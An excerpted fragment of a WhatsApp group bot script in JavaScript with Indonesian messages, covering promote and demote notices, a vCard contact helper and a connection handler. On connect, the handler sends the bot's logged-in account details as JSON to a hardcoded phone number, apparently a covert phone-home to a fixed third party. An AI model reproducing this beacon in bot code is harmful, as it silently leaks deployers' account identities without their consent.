...
if (global.db) setInterval(async () => {
  ...
  auth: state,
        ...
        try {
            ...
            for (let num of participants) {
                ...
                externalAdReply: {
                    ...
                    Resta.sendMessage(anu.id, { text: `@${num.split('@')[0]} Promote From ${metadata.subject}`, contextInfo: {
				mentionedJid: [num],
                externalAdReply: {
                    ...
                    Resta.sendMessage(anu.id, { text: `@${num.split('@')[0]} Demote From ${metadata.subject}`, contextInfo: {
				mentionedJid: [num],
                externalAdReply: {
    ...
    Resta.sendContact = async (jid, kon, quoted = '', opts = {}) => {
        let list = []
        for (let i of kon) {
			let aloq = await pickRandom(global.owner)
            let name = await Resta.getName(`${i}@s.whatsapp.net`) || 'Tidak Diketahui'
            list.push({
                displayName: name,
                vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${name}\nFN:${name}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
            })
        }
        Resta.sendMessage(jid, { contacts: { displayName: `${list.length} Kontak`, contacts: list }, ...opts, contextInfo: {
            externalAdReply: {
                title: `@this.ilham_`,
                body: "",
    ...
    Resta.ev.on('connection.update', async (update) => {
        ...
        try {
          ...
          if (update.connection == "open" || update.receivedPendingNotifications == "true") {
            ...
            lolcatjs.fromString(`✅ Berhasil Tersambung Ke ` + JSON.stringify(Resta.user, null, 2))
            global.stared = ['6281233649676']
            let txtown = `✅ Berhasil Tersambung Ke ` + JSON.stringify(Resta.user, null, 2)
            lolcatjs.fromString('Sukses Mengirim Pesan Ke Owner ☑️')
            Resta.sendMessage(global.stared+'@s.whatsapp.net', { text: txtown, contextInfo: {
                externalAdReply: {
